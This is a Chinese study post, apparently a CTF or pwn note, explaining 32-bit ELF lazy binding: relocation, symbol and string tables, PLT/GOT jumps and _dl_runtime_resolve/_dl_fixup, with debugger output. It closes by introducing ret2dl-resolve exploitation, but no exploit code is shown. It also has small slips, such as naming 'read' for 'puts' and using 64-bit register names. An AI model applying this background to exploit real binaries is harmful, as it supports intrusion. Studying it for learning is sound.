<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/retdll$ readelf -r a.out</span><br><span class="line"></span><br><span class="line">Relocation section '.rel.dyn' at offset 0x290 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">08049f</span>fc  <span class="number">00000206</span> R_386_GLOB_DAT    <span class="number">00000000</span>   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section '.rel.plt' at offset 0x298 contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">0804</span>a00c  <span class="number">00000107</span> R_386_JUMP_SLOT   <span class="number">00000000</span>   <span class="built_in">puts</span>@GLIBC_2<span class="number">.0</span></span><br><span class="line"><span class="number">0804</span>a010  <span class="number">00000307</span> R_386_JUMP_SLOT   <span class="number">00000000</span>   __libc_start_main@GLIBC_2<span class="number">.0</span></span><br></pre></td></tr></table></figure>

<p>这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  <span class="comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span></span><br><span class="line">  <span class="comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span></span><br><span class="line">  <span class="comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>

<h3 id="DT-STRTAB-dynstr"><a href="#DT-STRTAB-dynstr" class="headerlink" title="DT_STRTAB(.dynstr)"></a>DT_STRTAB(.dynstr)</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">0804821</span>C ; ELF String Table</span><br><span class="line">LOAD:<span class="number">0804821</span>C byte_804821C    db <span class="number">0</span>                    ; DATA XREF: LOAD:<span class="number">080481</span>DC↑o</span><br><span class="line">LOAD:<span class="number">0804821</span>C                                         ; LOAD:<span class="number">080481</span>EC↑o ...</span><br><span class="line">LOAD:0804821D aLibcSo6        db 'libc.so.6',0</span><br><span class="line">LOAD:08048227 aIoStdinUsed    db '_IO_stdin_used',0   ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:08048236 aPuts           db 'puts',0             ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804823B aLibcStartMain  db '__libc_start_main',0</span><br></pre></td></tr></table></figure>

<p> 一个字符串表，<strong>index</strong>为<strong>0</strong>的地方永远是<strong>0</strong>，然后后面是动态链接所需的字符串，<strong>0</strong>结尾，包括导入函数名，比方说这里很明显有个<strong>puts</strong>。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移，比方说，在这里，就是字符串相对<strong>0x804821C</strong>的偏移 </p>
<h3 id="DT-SYMTAB-dynsym"><a href="#DT-SYMTAB-dynsym" class="headerlink" title="DT_SYMTAB(.dynsym)"></a>DT_SYMTAB(.dynsym)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/retdll$  readelf -s a.out</span><br><span class="line"></span><br><span class="line">Symbol table '.dynsym' contains 5 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND <span class="built_in">puts</span>@GLIBC_2<span class="number">.0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2<span class="number">.0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">4</span>: <span class="number">080484b</span>c     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">16</span> _IO_stdin_used</span><br></pre></td></tr></table></figure>

<p> 这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的<strong>puts</strong>。结构体定义如下 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(info) ((info)&gt;&gt;8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(info) ((unsigned char)(info))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(sym, type) (((sym)&lt;&lt;8)+(unsigned char)(type))</span></span><br></pre></td></tr></table></figure>

<h2 id="解析符号"><a href="#解析符号" class="headerlink" title="解析符号"></a>解析符号</h2><p> 假设<strong>.dynsym</strong>的地址为<strong>080481cc</strong>，又因为<strong>puts</strong>函数对应的<strong>num</strong>为<strong>1</strong> ，则程序会去<strong>0x080481cc+0x10*1</strong>寻找<strong>st_name</strong>即<strong>puts</strong>字符串在<strong>.dynstr</strong>中的偏移 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/<span class="number">4</span>wx <span class="number">0x080481cc</span>+<span class="number">0x10</span>*<span class="number">1</span></span><br><span class="line"><span class="number">0x80481dc</span>:    <span class="number">0x0000001a</span>    <span class="number">0x00000000</span>    <span class="number">0x00000000</span>    <span class="number">0x00000012</span></span><br></pre></td></tr></table></figure>

<p>解释一下这一串地址<code>0x080481cc+0x10*1</code>的意义</p>
<blockquote>
<ul>
<li>0x080481cc 对应.dynsym的地址</li>
<li>0×10 ： 每一条symbol信息的大小在SYMENT中体现，为16 bytes （可以用readelf -d fun命令查看）</li>
<li>1 ： num值为1</li>
</ul>
</blockquote>
<p>可以看到0x080481dc对应的第一个值为0x1a， 再利用如下命令即可找到puts符号 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/s 0x0804821c+0x1a</span><br><span class="line">0x8048236:    &quot;puts&quot;</span><br></pre></td></tr></table></figure>

<p>0x0804821c+0x1a 解析</p>
<blockquote>
<ul>
<li>0x0804821c 对应于.dynstr的地址</li>
<li>0x1a 对应刚才得到的偏移</li>
</ul>
</blockquote>
<h1 id="函数执行流程分析"><a href="#函数执行流程分析" class="headerlink" title="函数执行流程分析"></a>函数执行流程分析</h1><p>用gdb运行这个程序，并在puts函数处下断点 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x80482e0</span>  &lt;<span class="built_in">puts</span>@plt&gt;                  jmp    dword ptr [<span class="number">0x804a00c</span>]</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x80482e6</span>  &lt;<span class="built_in">puts</span>@plt+<span class="number">6</span>&gt;                push   <span class="number">0</span></span><br><span class="line">   <span class="number">0x80482eb</span>  &lt;<span class="built_in">puts</span>@plt+<span class="number">11</span>&gt;               jmp    <span class="number">0x80482d0</span></span><br></pre></td></tr></table></figure>

<p>执行到我们下的断点处发现，会跳转到<code>0x804a00c</code>这个地址 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/wx <span class="number">0x804a00c</span></span><br><span class="line"><span class="number">0x804a00c</span>:	<span class="number">0x080482e6</span></span><br></pre></td></tr></table></figure>

<p>0x0804a00c这个地址处存储的内容为&lt;puts@plt+6&gt;的地址，因为这个程序第一次运行所以got表中没有保存read函数的地址，所以程序又跳转会&lt;puts@plt+6&gt;，所以紧接着会执行 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x80482e6</span>  &lt;<span class="built_in">puts</span>@plt+<span class="number">6</span>&gt;                push   <span class="number">0</span></span><br><span class="line"><span class="number">0x80482eb</span>  &lt;<span class="built_in">puts</span>@plt+<span class="number">11</span>&gt;               jmp    <span class="number">0x80482d0</span></span><br></pre></td></tr></table></figure>

<p>先将0×0压栈（0×0 表示相对.rel.plt的偏移，通过上面分析我们可以知道，read符号在.rel.plt中的位置为第一个，所以偏移为0），又跳转到0x80482d0，看一下该地处的内容 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">2</span>i <span class="number">0x080482d0</span></span><br><span class="line">   <span class="number">0x80482d0</span>:	push   DWORD PTR ds:<span class="number">0x804a004</span></span><br><span class="line">   <span class="number">0x80482d6</span>:	jmp    DWORD PTR ds:<span class="number">0x804a008</span></span><br></pre></td></tr></table></figure>

<p>会将<strong>0x804a004</strong>压栈，然后跳转到<strong>0x804a008</strong>处。</p>
<ul>
<li><strong>0x804a004</strong>处对应一个指向内部数据结构的指针，类型是 <strong>link_map</strong>，在动态装载器内部使用，包含了进行符号解析需要的当前 <strong>ELF</strong> 对象的信息。在它的 <strong>l_info</strong> 域中保存了 .<strong>dynamic</strong> 段中大多数条目的指针构成的一个数组，我们后面会利用它。 <strong>link_map</strong>的指针，这个结构是干什么的，我们不关心，但是有一点要知道，它包含了.<strong>dynamic</strong>的指针，通过这个<strong>link_map</strong>，<strong>_dl_runtime_resolve</strong>函数可以访问到.<strong>dynamic</strong>这个<strong>section</strong> </li>
<li><strong>0x0804a008</strong> 处为函数 <strong>dl_runtime_resolve</strong>(<strong>link_map</strong>,<strong>rel_offset</strong>)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4wx 0xf7fee000</span><br><span class="line">0xf7fee000 &lt;_dl_runtime_resolve&gt;:	0x8b525150	0x8b102454	0xe80c2444	0xffff97d0</span><br></pre></td></tr></table></figure>

<p> 0xe80c2444是<strong>.dynamic</strong>的指针，与前面图中一致</p>
<p> 我们看一下dl_runtime_resolve()函数的实现 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>i <span class="number">0xf7fee000</span></span><br><span class="line">   <span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;:	push   eax</span><br><span class="line">   <span class="number">0xf7fee001</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;:	push   ecx</span><br><span class="line">   <span class="number">0xf7fee002</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;:	push   edx</span><br><span class="line">   <span class="number">0xf7fee003</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;:	mov    edx,DWORD PTR [esp+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0xf7fee007</span> &lt;_dl_runtime_resolve+<span class="number">7</span>&gt;:	mov    eax,DWORD PTR [esp+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0xf7fee00b</span> &lt;_dl_runtime_resolve+<span class="number">11</span>&gt;:	call   <span class="number">0xf7fe77e0</span> &lt;_dl_fixup&gt;</span><br><span class="line">   <span class="number">0xf7fee010</span> &lt;_dl_runtime_resolve+<span class="number">16</span>&gt;:	pop    edx</span><br><span class="line">   <span class="number">0xf7fee011</span> &lt;_dl_runtime_resolve+<span class="number">17</span>&gt;:	mov    ecx,DWORD PTR [esp]</span><br><span class="line">   <span class="number">0xf7fee014</span> &lt;_dl_runtime_resolve+<span class="number">20</span>&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   <span class="number">0xf7fee017</span> &lt;_dl_runtime_resolve+<span class="number">23</span>&gt;:	mov    eax,DWORD PTR [esp+<span class="number">0x4</span>]</span><br><span class="line">   <span class="number">0xf7fee01b</span> &lt;_dl_runtime_resolve+<span class="number">27</span>&gt;:	ret    <span class="number">0xc</span></span><br><span class="line">   <span class="number">0xf7fee01e</span>:	xchg   ax,ax</span><br><span class="line">   <span class="number">0xf7fee020</span> &lt;_dl_runtime_profile&gt;:	push   esp</span><br><span class="line">   <span class="number">0xf7fee021</span> &lt;_dl_runtime_profile+<span class="number">1</span>&gt;:	add    DWORD PTR [esp],<span class="number">0x8</span></span><br><span class="line">   <span class="number">0xf7fee025</span> &lt;_dl_runtime_profile+<span class="number">5</span>&gt;:	push   ebp</span><br><span class="line">   <span class="number">0xf7fee026</span> &lt;_dl_runtime_profile+<span class="number">6</span>&gt;:	push   eax</span><br><span class="line">   <span class="number">0xf7fee027</span> &lt;_dl_runtime_profile+<span class="number">7</span>&gt;:	push   ecx</span><br><span class="line">   <span class="number">0xf7fee028</span> &lt;_dl_runtime_profile+<span class="number">8</span>&gt;:	push   edx</span><br><span class="line">   <span class="number">0xf7fee029</span> &lt;_dl_runtime_profile+<span class="number">9</span>&gt;:	mov    ecx,esp</span><br><span class="line">   <span class="number">0xf7fee02b</span> &lt;_dl_runtime_profile+<span class="number">11</span>&gt;:	sub    esp,<span class="number">0x8</span></span><br></pre></td></tr></table></figure>

<p>在<strong>0xf7fee00b</strong>地址处调用了 <strong>_dl_fixup()</strong>函数，并且采用寄存器传参，<strong>dl_fixup()</strong>是在<strong>dl-runtime.c</strong>中实现的， <strong>_dl_fixup</strong>函数传入的两个参数一个是<strong>rdi</strong>寄存器中存储的<strong>link_map</strong>，<strong>rsi</strong>是<strong>GOT</strong>表中关于<strong>PLT</strong>重定位的索引值，后面要根据该索引值写入新的地址 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">｛</span><br><span class="line">    const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL);</span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);</span><br><span class="line">    return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">｝</span><br></pre></td></tr></table></figure>

<p>逐行解释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>

<p>这里面 <strong>link_map</strong>还是一开始传进来的<strong>link_map</strong>,但一开始传进来的<strong>rel_offset</strong>改为用<strong>reloc_arg</strong>表示：<code>reloc_arg=reloffset</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure>

<p>用来计算重定位入口<strong>reloc</strong>，<strong>JMPREL</strong>即<strong>.rel.plt</strong>地址，<strong>reloc_offset</strong>即<strong>reloc_arg</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure>

<p>找到在.<strong>dynsym</strong>中对应的条目，<strong>[ELFW(R_SYM) (reloc-&gt;r_info)]</strong>就是为了找到对应的<strong>num[?]</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure>

<p>检查<strong>reloc-&gt;r_info</strong>的最低位是不是<strong>R_386_JUMP_SLOT=7</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL);</span><br></pre></td></tr></table></figure>

<p>根据<strong>st_name</strong>对应的偏移，去<strong>.dynstr(STRTAB)</strong>中查找对应的字符串，<strong>result</strong>为<strong>libc</strong>基地址(不知道是怎么找到<strong>result</strong>的，反正知道就好了。。。)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);</span><br></pre></td></tr></table></figure>

<p><strong>value</strong>为函数的实际地址，在<strong>libc</strong>基地址的基础上加上函数在<strong>libc</strong>中的偏移</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure>

<p>将函数地址写到<strong>got</strong>表对应位置</p>
<p>简单来说_dl_runtime_resolve就是会</p>
<ol>
<li>用<strong>link_map</strong>访问.<strong>dynamic</strong>，取出.<strong>dynstr</strong>, .<strong>dynsym</strong>, <strong>.rel.plt</strong>的指针</li>
<li><strong>.rel.plt + 第二个参数</strong>求出当前函数的重定位表项<strong>Elf32_Rel</strong>的指针，记作<strong>rel</strong></li>
<li><strong>rel-&gt;r_info &gt;&gt; 8</strong>作为.<strong>dynsym</strong>的下标，求出当前函数的符号表项<strong>Elf32_Sym</strong>的指针，记作<strong>sym</strong></li>
<li><strong>.dynstr + sym-&gt;st_name</strong>得出符号名字符串指针</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给<strong>*rel-&gt;r_offset</strong>，即<strong>GOT</strong>表</li>
<li>调用这个函数</li>
</ol>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/image003.jpg" alt></p>
<blockquote>
<h5 id="从一个ELF动态链接库文件中，根据已知的函数名称，找到相应的函数起始地址，那么过程是这样的，先从前面的ELF-的ehdr中找到文件的偏移e-phoff处，在这其中找到为PT-DYNAMIC-的d-tag的phdr，从这个地址开始处找到DT-DYNAMIC的节，最后从其中找到这样一个Elf32-Sym结构，它的st-name所指的字符串与给定的名称相符，就用st-value便是了"><a href="#从一个ELF动态链接库文件中，根据已知的函数名称，找到相应的函数起始地址，那么过程是这样的，先从前面的ELF-的ehdr中找到文件的偏移e-phoff处，在这其中找到为PT-DYNAMIC-的d-tag的phdr，从这个地址开始处找到DT-DYNAMIC的节，最后从其中找到这样一个Elf32-Sym结构，它的st-name所指的字符串与给定的名称相符，就用st-value便是了" class="headerlink" title="从一个ELF动态链接库文件中，根据已知的函数名称，找到相应的函数起始地址，那么过程是这样的，先从前面的ELF 的ehdr中找到文件的偏移e_phoff处，在这其中找到为PT_DYNAMIC  的d_tag的phdr，从这个地址开始处找到DT_DYNAMIC的节，最后从其中找到这样一个Elf32_Sym结构，它的st_name所指的字符串与给定的名称相符，就用st_value便是了"></a>从一个ELF动态链接库文件中，根据已知的函数名称，找到相应的函数起始地址，那么过程是这样的，先从前面的ELF 的ehdr中找到文件的偏移e_phoff处，在这其中找到为PT_DYNAMIC  的d_tag的phdr，从这个地址开始处找到DT_DYNAMIC的节，最后从其中找到这样一个Elf32_Sym结构，它的st_name所指的字符串与给定的名称相符，就用st_value便是了</h5></blockquote>
<h1 id="深入理解"><a href="#深入理解" class="headerlink" title="深入理解"></a>深入理解</h1><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0xf7fee000</span> &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">  <span class="number">0xf7fee001</span> &lt;_dl_runtime_resolve+<span class="number">1</span>&gt;     push   ecx</span><br><span class="line">  <span class="number">0xf7fee002</span> &lt;_dl_runtime_resolve+<span class="number">2</span>&gt;     push   edx</span><br><span class="line">  <span class="number">0xf7fee003</span> &lt;_dl_runtime_resolve+<span class="number">3</span>&gt;     mov    edx, dword ptr [esp + <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0xf7fee007</span> &lt;_dl_runtime_resolve+<span class="number">7</span>&gt;     mov    eax, dword ptr [esp + <span class="number">0xc</span>]</span><br><span class="line">► <span class="number">0xf7fee00b</span> &lt;_dl_runtime_resolve+<span class="number">11</span>&gt;    call   _dl_fixup &lt;<span class="number">0xf7fe77e0</span>&gt;</span><br><span class="line">       arg[<span class="number">0</span>]: <span class="number">0xffffd094</span> ◂— <span class="number">0x0</span></span><br><span class="line">       arg[<span class="number">1</span>]: <span class="number">0xffffd070</span> ◂— <span class="number">0x1</span></span><br></pre></td></tr></table></figure>

<p>调用函数过程中已经压入了两个参数：第一个是动态链接库的<strong>struct link_map*</strong> 指针，另一个是<strong>rel</strong>的索引值， 这里是给下面的fixup函数以寄存器传递参数 </p>
<p>真正的解析在<strong>do_lookup</strong>中实现了，我这里还是它的实现伪代码:</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Elf32_Addr  <span class="title">do_lookup</span><span class="params">(struct link_map* lmap,<span class="keyword">char</span>* symname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>* <span class="title">search_lmap</span>=<span class="title">NULL</span>;</span></span><br><span class="line">	Elf32_Sym* symtab;</span><br><span class="line">	Elf32_Sym* sym;</span><br><span class="line">	<span class="keyword">char</span>* strtab;</span><br><span class="line">	<span class="keyword">char</span>* find_name;</span><br><span class="line">	<span class="keyword">int</span> symindx;   </span><br><span class="line">	Elf32_Word hash=elf_hash_name(symname);</span><br><span class="line">	for_each_search_lmap_in_search_list(lmap,search_lmap)</span><br><span class="line">	&#123;</span><br><span class="line">		symtab=search_lmap-&gt;l_info[DT_SYMTAB].d_un.d_ptr;</span><br><span class="line">		strtab=search_lmap-&gt;l_info[DT_STRTAB].d_un.d_ptr;</span><br><span class="line">		<span class="keyword">for</span> (symindx=search_lmap-&gt;l_buckets[hash % search_lmap-&gt;l_nbuckets];</span><br><span class="line">		symindx!=<span class="number">0</span>;symindx=search_lmap-&gt;l_chain[symindx])</span><br><span class="line">		&#123;</span><br><span class="line">			sym=&amp;symtab[symindx];</span><br><span class="line">			find_name=strtab+sym-&gt;st_name;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strcmp</span>(find_name,symname)==<span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> sym-&gt;st_value+search_lmap-&gt;l_addr;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/image004.jpg" alt></p>
<h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><p>函数第一次被调用过程</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%96%B0%E6%89%8B%E5%90%91%E2%80%94%E2%80%94%E6%B5%85%E8%B0%88PLT%E5%92%8CGOT/5970003-bcf9343191848103.png" alt="img"></p>
<p>第一步由函数调用跳入到<strong>PLT</strong>表中，然后第二步<strong>PLT</strong>表跳到<strong>GOT</strong>表中，可以看到第三步由<strong>GOT</strong>表回跳到<strong>PLT</strong>表中，这时候进行压栈，把代表函数的<strong>ID</strong>压栈，接着第四步跳转到公共的<strong>PLT</strong>表项中，第5步进入到<strong>GOT</strong>表中，然后<strong>_dl_runtime_resolve</strong>对动态函数进行地址解析和重定位，第七步把动态函数真实的地址写入到<strong>GOT</strong>表项中，然后执行函数并返回。</p>
<p>函数之后被调用过程</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E6%96%B0%E6%89%8B%E5%90%91%E2%80%94%E2%80%94%E6%B5%85%E8%B0%88PLT%E5%92%8CGOT/5970003-9baedd55881a39dd.png" alt="img"></p>
<p>可以看到，第一步还是由函数调用跳入到<strong>PLT</strong>表，但是第二步跳入到<strong>GOT</strong>表中时，由于这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回。</p>
<p>对于动态函数的调用，第一次要经过地址解析和回写到<strong>GOT</strong>表项中，第二次直接调用即可</p>
<h1 id="ret2dl-resolve-利用"><a href="#ret2dl-resolve-利用" class="headerlink" title="ret2dl-resolve 利用"></a>ret2dl-resolve 利用</h1><p>主要是看 <strong>.dynamic</strong>能否可写 </p>
